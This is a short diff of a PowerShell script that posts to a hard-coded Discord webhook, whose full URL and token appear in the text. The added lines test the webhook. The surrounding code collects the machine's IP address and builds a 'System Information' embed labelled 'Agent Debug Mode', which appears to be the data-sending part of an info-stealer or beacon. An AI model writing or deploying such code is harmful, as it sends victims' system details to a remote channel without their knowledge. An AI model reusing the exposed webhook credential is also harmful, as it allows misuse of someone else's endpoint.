@@ -1,4 +1,12 @@
 $webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
+$test = @{ content = "Test message" } | ConvertTo-Json
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $test -ContentType "application/json"
+    Write-Host "[+] Webhook test OK"
+} catch {
+    Write-Host "[-] Webhook test failed: $_"
+    exit
+}
 
 # Lấy IP với fallback
 try {
@@ -7,7 +15,7 @@ try {
     $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
 }
 $embedHash = @{
-    content = "🚀 **Agent Debug Mode**"
+    content = "Agent Debug Mode"
     embeds = @(
         @{
             title = "System Information"
